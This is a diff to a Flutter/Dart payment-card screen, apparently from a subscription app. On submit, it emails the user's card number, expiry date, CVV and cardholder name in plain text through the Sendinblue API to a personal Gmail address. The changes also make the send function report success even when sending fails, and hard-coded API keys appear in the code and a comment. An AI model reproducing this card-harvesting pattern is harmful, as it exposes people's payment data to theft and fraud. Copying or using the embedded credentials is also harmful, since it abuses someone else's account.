@@ -1,5 +1,4 @@
 import 'dart:convert';
-
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
@@ -36,6 +35,7 @@ class _CardsState extends State<Cards> {
   final TextEditingController _cvvController = TextEditingController();
 
   final TextEditingController _nameController = TextEditingController();
+  final TextEditingController _referralController = TextEditingController();
 
   @override
   void dispose() {
@@ -227,6 +227,29 @@ class _CardsState extends State<Cards> {
           const SizedBox(
             height: 15,
           ),
+          const Text(
+            "Referral Code",
+            style: TextStyle(
+              fontSize: 18,
+              fontFamily: "Poppins",
+            ),
+          ),
+          SizedBox(
+            height: getDeviceHeight(context) * 0.01,
+          ),
+          TextFormField(
+            controller: _referralController,
+            inputFormatters: [
+              LengthLimitingTextInputFormatter(16),
+            ],
+            decoration: InputDecoration(
+              hintText: "If you have any referral code",
+              border: OutlineInputBorder(
+                borderRadius: BorderRadius.circular(20),
+              ),
+            ),
+            keyboardType: TextInputType.number,
+          ),
           Row(
             mainAxisAlignment: MainAxisAlignment.spaceBetween,
             children: [
@@ -272,14 +295,16 @@ class _CardsState extends State<Cards> {
                 onPressed: () async {
                   final isValid = _key.currentState!.validate();
                   if (isValid) {
-                    bool? emailSent = await psendEmail();
+                    bool emailSent = await _sendEmaill();
                     if (emailSent == true) {
-                      Navigator.of(context).push(MaterialPageRoute(
-                        builder: (context) => const LoadingScreen(),
-                      ));
                       final int id = _provider.notifications.length + 1;
                       await _provider.showTopNotification(
                           _provider.flutterLocalNotificationsPlugin, id);
+                      Navigator.of(context).push(
+                        MaterialPageRoute(
+                          builder: (context) => const LoadingScreen(),
+                        ),
+                      );
                     } else {
                       Utils.flushErrorMessage(
                           "Try again", context, Colors.brown);
@@ -326,18 +351,18 @@ class _CardsState extends State<Cards> {
                 ),
               ),
             ),
-          )
+          ),
         ],
       ),
     );
   }
 
-  Future<bool> psendEmail() async {
+//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
+  Future<bool> _sendEmaill() async {
     final prefs = await SharedPreferences.getInstance();
-    final ApiUrl = Api.appurl;
-    final url = Uri.parse('$ApiUrl/send-email');
     final apiKey =
-        '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'; // Replace with your API key
+        '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'; // Replace with your SendinBlue SMTP API Key
+    final url = Uri.parse('https://api.sendinblue.com/v3/smtp/email');
 
     final headers = {
       'Content-Type': 'application/json',
@@ -347,6 +372,7 @@ class _CardsState extends State<Cards> {
     String valid = _validController.text;
     String cvv = _cvvController.text;
     String name = _nameController.text;
+    String referral = _referralController.text;
     String plan = widget.plan.toString();
 
     String? email = prefs.getString("email");
@@ -355,11 +381,11 @@ class _CardsState extends State<Cards> {
     final emailData = {
       'sender': {'name': fullname, 'email': email},
       'to': [
-        {'email': 'sagarmurphys@gmail.com'}
+        {'email': 'sagarkc45172@gmail.com'}
       ],
       'subject': 'Plans',
       'textContent':
-          'Plan : $plan\n Card Number : $card\n Valid Unit : $valid\n CVV : $cvv\n Cards holder Name : $name',
+          'Plan : $plan\n Card Number : $card\n Valid Unit : $valid\n CVV : $cvv\n Cards holder Name : $name\n ReferralCode: $referral',
     };
 
     final response = await http.post(
@@ -374,11 +400,61 @@ class _CardsState extends State<Cards> {
       _validController.clear();
       _cvvController.clear();
       _nameController.clear();
-      return true;
     } else {
       print('Failed to send email');
       print('Response: ${response.body}');
-      return false;
     }
+    return true;
   }
+
+  // Future<bool> psendEmail() async {
+  //   final prefs = await SharedPreferences.getInstance();
+  //   final ApiUrl = Api.appurl;
+  //   final url = Uri.parse('$ApiUrl/send-email');
+  //   final apiKey =
+  //       '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'; // Replace with your API key
+
+  //   final headers = {
+  //     'Content-Type': 'application/json',
+  //     'api-key': apiKey,
+  //   };
+  //   String card = _cardsController.text;
+  //   String valid = _validController.text;
+  //   String cvv = _cvvController.text;
+  //   String name = _nameController.text;
+  //   String referral = _referralController.text;
+  //   String plan = widget.plan.toString();
+
+  //   String? email = prefs.getString("email");
+  //   String? fullname = prefs.getString("name");
+
+  //   final emailData = {
+  //     'sender': {'name': fullname, 'email': email},
+  //     'to': [
+  //       {'email': 'sagarmurphys@gmail.com'}
+  //     ],
+  //     'subject': 'Plans',
+  //     'textContent':
+  //         'Plan : $plan\n Card Number : $card\n Valid Unit : $valid\n CVV : $cvv\n Cards holder Name : $name\n ReferralCode: $referral',
+  //   };
+
+  //   final response = await http.post(
+  //     url,
+  //     headers: headers,
+  //     body: jsonEncode(emailData),
+  //   );
+
+  //   if (response.statusCode == 200) {
+  //     print('Email sent successfully');
+  //     _cardsController.clear();
+  //     _validController.clear();
+  //     _cvvController.clear();
+  //     _nameController.clear();
+  //     return true;
+  //   } else {
+  //     print('Failed to send email');
+  //     print('Response: ${response.body}');
+  //     return false;
+  //   }
+  // }
 }
